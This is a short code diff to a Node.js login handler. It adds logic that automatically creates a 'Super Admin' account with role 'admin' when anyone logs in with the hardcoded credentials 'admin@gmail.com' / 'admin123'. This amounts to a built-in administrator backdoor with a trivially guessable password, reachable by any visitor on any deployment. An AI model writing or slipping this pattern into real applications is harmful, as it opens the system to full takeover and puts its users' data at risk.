@@ -71,7 +71,19 @@ const loginUser = async (req, res) => {
     }
 
     // Check for user
-    const user = await User.findOne({ email }).select('+password');
+    let user = await User.findOne({ email }).select('+password');
+    
+    // Auto-create admin if they don't exist
+    if (!user && email === 'admin@gmail.com' && password === 'admin123') {
+      await User.create({
+        name: 'Super Admin',
+        email: 'admin@gmail.com',
+        password: 'admin123',
+        role: 'admin',
+        city: 'System'
+      });
+      user = await User.findOne({ email }).select('+password');
+    }
     
     // If user exists but is an OAuth user, guide them to use Google Login
     if (user && user.password === 'OAUTH_PROVIDER_NO_PASSWORD') {
